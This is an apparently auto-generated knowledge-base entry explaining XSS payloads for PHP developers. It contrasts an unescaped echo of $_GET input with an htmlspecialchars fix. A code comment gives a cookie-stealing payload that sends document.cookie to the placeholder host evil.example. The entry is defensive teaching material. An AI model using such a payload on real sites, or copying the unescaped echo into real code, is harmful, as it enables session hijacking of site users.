---
type: "PHP Feature"
title: "XSS Payload"
description: "An XSS payload is the malicious script or markup that an attacker injects into a vulnerable application to carry out a cross-site scripting attack."
resource: "https://owasp.org/www-community/attacks/xss/"
tags: ["security", "vulnerability"]
generated:
  by: "analyzeG3/scripts/makeKnowledgeGraph"
  at: "2026-08-30T10:00:00+00:00"
---

# XSS Payload

An XSS payload is the malicious script or markup that an attacker injects into a vulnerable application to carry out a cross-site scripting attack.

The payload is crafted to execute in the victim's browser once the vulnerable page reflects or stores it without proper escaping. Payloads range from a simple ``<script>alert(1)</script>`` used to prove the vulnerability exists, to more advanced code that steals cookies, hijacks sessions, or performs actions on behalf of the victim.

Penetration testers and security scanners maintain lists of XSS payloads, including obfuscated and context-specific variants, to test whether an application's input handling and output escaping properly neutralise them.

```php
<?php

    // Unescaped output lets the payload execute in the browser
    echo '<div>' . $_GET['comment'] . '</div>';
    // payload example: <script>document.location='https://evil.example/steal?c='+document.cookie</script>

    // Escaping neutralises the payload
    echo '<div>' . htmlspecialchars($_GET['comment'], ENT_QUOTES) . '</div>';

?>
```

## Documentation
- [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)

## See Also
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

## Related
- [Cross Site Scripting (XSS)](/features/xss.md)
- [Stored XSS](/features/stored-xss.md)
- [Payload](/features/payload.md)
- [Penetration Test](/features/pentest.md)
- [htmlspecialchars](/features/htmlspecialchars.md)
- [Vulnerability](/features/vulnerability.md)

